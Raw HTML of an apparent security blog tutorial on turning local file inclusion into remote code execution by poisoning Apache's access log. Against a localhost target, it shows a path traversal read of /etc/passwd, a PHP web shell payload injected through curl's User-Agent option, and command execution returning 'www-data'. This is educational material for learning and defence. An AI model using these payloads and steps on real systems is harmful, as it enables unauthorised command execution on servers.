<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>LFI to RCE with Log Poisoning | S4MY9’s Blog</title><meta name=keywords content="RCE,LFI"><meta name=description content="Introduction LFI (Local File Inclusion) is a common vulnerability found in web applications, allowing an attacker to include local files in the server. LFI Log Poisoning is a technique that leverages LFI vulnerabilities to write arbitrary content to log files on the server. By doing so, an attacker can leverage a LFI to a RCE.
This is the path of a vulnerable LFI :
http://127.0.0.1/index.php?page=/../../../../etc/passwd
The local file can be read :"><meta name=author content><link rel=canonical href=https://canonical.url/to/page><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe+FVUFzPh7U=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://s4my9.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://s4my9.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://s4my9.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://s4my9.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://s4my9.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="LFI to RCE with Log Poisoning"><meta property="og:description" content="Introduction LFI (Local File Inclusion) is a common vulnerability found in web applications, allowing an attacker to include local files in the server. LFI Log Poisoning is a technique that leverages LFI vulnerabilities to write arbitrary content to log files on the server. By doing so, an attacker can leverage a LFI to a RCE.
This is the path of a vulnerable LFI :
http://127.0.0.1/index.php?page=/../../../../etc/passwd
The local file can be read :"><meta property="og:type" content="article"><meta property="og:url" content="https://s4my9.github.io/posts/lfi-to-rce-with-log-poisoning/"><meta property="og:image" content="https://s4my9.github.io/%3Cimage%20path/url%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-04-06T11:30:03+00:00"><meta property="article:modified_time" content="2023-04-06T11:30:03+00:00"><meta property="og:site_name" content="S4MY9’s Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4my9.github.io/%3Cimage%20path/url%3E"><meta name=twitter:title content="LFI to RCE with Log Poisoning"><meta name=twitter:description content="Introduction LFI (Local File Inclusion) is a common vulnerability found in web applications, allowing an attacker to include local files in the server. LFI Log Poisoning is a technique that leverages LFI vulnerabilities to write arbitrary content to log files on the server. By doing so, an attacker can leverage a LFI to a RCE.
This is the path of a vulnerable LFI :
http://127.0.0.1/index.php?page=/../../../../etc/passwd
The local file can be read :"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://s4my9.github.io/posts/"},{"@type":"ListItem","position":2,"name":"LFI to RCE with Log Poisoning","item":"https://s4my9.github.io/posts/lfi-to-rce-with-log-poisoning/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"LFI to RCE with Log Poisoning","name":"LFI to RCE with Log Poisoning","description":"Introduction LFI (Local File Inclusion) is a common vulnerability found in web applications, allowing an attacker to include local files in the server. LFI Log Poisoning is a technique that leverages LFI vulnerabilities to write arbitrary content to log files on the server. By doing so, an attacker can leverage a LFI to a RCE.\nThis is the path of a vulnerable LFI :\nhttp://127.0.0.1/index.php?page=/../../../../etc/passwd\nThe local file can be read :","keywords":["RCE","LFI"],"articleBody":"Introduction LFI (Local File Inclusion) is a common vulnerability found in web applications, allowing an attacker to include local files in the server. LFI Log Poisoning is a technique that leverages LFI vulnerabilities to write arbitrary content to log files on the server. By doing so, an attacker can leverage a LFI to a RCE.\nThis is the path of a vulnerable LFI :\nhttp://127.0.0.1/index.php?page=/../../../../etc/passwd\nThe local file can be read :\nroot:x:0:0:root:/root:/usr/bin/zsh daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin Demonstration An attacker is now abble to include a log file in a URL parameter and then inject malicious code into that log file. When the web application reads the log file, it will execute the malicious code and potentially grant the attacker access to sensitive information or the ability to execute arbitrary commands on the server.\nTo perform LFI Log Poisoning, we need to inject code into a log file on the server. In this case, we will use the access.log file located in the /var/log/apache2/ directory.\nhttp://127.0.0.1/index.php?page=/../../../../var/log/apache2/access.log\n127.0.0.1 - - [05/Apr/2023:10:31:22 -0400] \"GET /index.html HTTP/1.1\" 200 1248 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36\" 127.0.0.1 - - [05/Apr/2023:10:31:22 -0400] \"GET /images/logo.png HTTP/1.1\" 304 - \"https://example.com/\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36\" 127.0.0.1 - - [05/Apr/2023:10:31:24 -0400] \"POST /login.php HTTP/1.1\" 200 1532 \"https://example.com/login.php\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36\" 192.168.0.10 - - [05/Apr/2023:11:12:45 -0400] \"GET /admin.php HTTP/1.1\" 401 381 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36\" 192.168.0.10 - admin [05/Apr/2023:11:13:08 -0400] \"GET /admin.php HTTP/1.1\" 200 2196 \"https://example.com/admin.php\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36\" In this case, we can try to change the user-agent to our payload to execute a malicious code.\nLet’s generate a cmd parameter.\n\u003c?php system($_GET[‘cmd’]); ?\u003e Modify the user-agent request with curl with option -A\ncurl http://127.0.0.1/ -A \u003c?php system($_GET[‘cmd’]); ?\u003e So now we can use the cmd parameter to inject a command. Let’s use whoami and see what’s happen.\ncurl http://127.0.0.1/index.php?page=/../../../../var/log/apache2/access.log\u0026cmd=whoami It’s works.\nwww-data ","wordCount":"365","inLanguage":"en","image":"https://s4my9.github.io/%3Cimage%20path/url%3E","datePublished":"2023-04-06T11:30:03Z","dateModified":"2023-04-06T11:30:03Z","mainEntityOfPage":{"@type":"WebPage","@id":"https://s4my9.github.io/posts/lfi-to-rce-with-log-poisoning/"},"publisher":{"@type":"Organization","name":"S4MY9’s Blog","logo":{"@type":"ImageObject","url":"https://s4my9.github.io/%3Clink%20/%20abs%20url%3E"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4my9.github.io/ accesskey=h title="S4MY9’s Blog (Alt + H)">S4MY9’s Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://s4my9.github.io/posts/ title=Posts><span>Posts</span></a></li><li><a href=https://s4my9.github.io/tags/ title=Tags><span>Tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://s4my9.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://s4my9.github.io/posts/>Posts</a></div><h1 class=post-title>LFI to RCE with Log Poisoning</h1><div class=post-meta><span title='2023-04-06 11:30:03 +0000 +0000'>April 6, 2023</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;365 words</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#demonstration>Demonstration</a></li></ul></nav></div></details></div><div class=post-content><h2 id=introduction>Introduction<a hidden class=anchor aria-hidden=true href=#introduction>#</a></h2><p>LFI (Local File Inclusion) is a common vulnerability found in web applications, allowing an attacker to include local files in the server. LFI Log Poisoning is a technique that leverages LFI vulnerabilities to write arbitrary content to log files on the server. By doing so, an attacker can leverage a LFI to a RCE.</p><p>This is the path of a vulnerable LFI :</p><p><code>http://127.0.0.1/index.php?page=/../../../../etc/passwd</code></p><p>The local file can be read :</p><pre tabindex=0><code>root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
</code></pre><h2 id=demonstration>Demonstration<a hidden class=anchor aria-hidden=true href=#demonstration>#</a></h2><p>An attacker is now abble to include a log file in a URL parameter and then inject malicious code into that log file. When the web application reads the log file, it will execute the malicious code and potentially grant the attacker access to sensitive information or the ability to execute arbitrary commands on the server.</p><p>To perform LFI Log Poisoning, we need to inject code into a log file on the server. In this case, we will use the <code>access.log</code> file located in the <code>/var/log/apache2/</code> directory.</p><p><code>http://127.0.0.1/index.php?page=/../../../../var/log/apache2/access.log</code></p><pre tabindex=0><code>127.0.0.1 - - [05/Apr/2023:10:31:22 -0400] &#34;GET /index.html HTTP/1.1&#34; 200 1248 &#34;-&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36&#34;
127.0.0.1 - - [05/Apr/2023:10:31:22 -0400] &#34;GET /images/logo.png HTTP/1.1&#34; 304 - &#34;https://example.com/&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36&#34;
127.0.0.1 - - [05/Apr/2023:10:31:24 -0400] &#34;POST /login.php HTTP/1.1&#34; 200 1532 &#34;https://example.com/login.php&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36&#34;
192.168.0.10 - - [05/Apr/2023:11:12:45 -0400] &#34;GET /admin.php HTTP/1.1&#34; 401 381 &#34;-&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36&#34;
192.168.0.10 - admin [05/Apr/2023:11:13:08 -0400] &#34;GET /admin.php HTTP/1.1&#34; 200 2196 &#34;https://example.com/admin.php&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36&#34;
</code></pre><p>In this case, we can try to change the <code>user-agent</code> to our payload to execute a malicious code.</p><p>Let&rsquo;s generate a <code>cmd</code> parameter.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> <span class=nx>system</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=nx>‘cmd’</span><span class=p>]);</span> <span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div><p>Modify the <code>user-agent</code> request with <code>curl</code> with option <code>-A</code></p><pre tabindex=0><code>curl http://127.0.0.1/ -A &lt;?php system($_GET[‘cmd’]); ?&gt;
</code></pre><p>So now we can use the <code>cmd</code> parameter to inject a command. Let&rsquo;s use <code>whoami</code> and see what&rsquo;s happen.</p><pre tabindex=0><code>curl http://127.0.0.1/index.php?page=/../../../../var/log/apache2/access.log&amp;cmd=whoami
</code></pre><p>It&rsquo;s works.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data
</span></span></code></pre></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4my9.github.io/tags/rce/>RCE</a></li><li><a href=https://s4my9.github.io/tags/lfi/>LFI</a></li></ul><nav class=paginav><a class=prev href=https://s4my9.github.io/posts/no-root-squash-privesc/><span class=title>« Prev</span><br><span>NFS no_root_squash privesc</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://s4my9.github.io/>S4MY9’s Blog</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>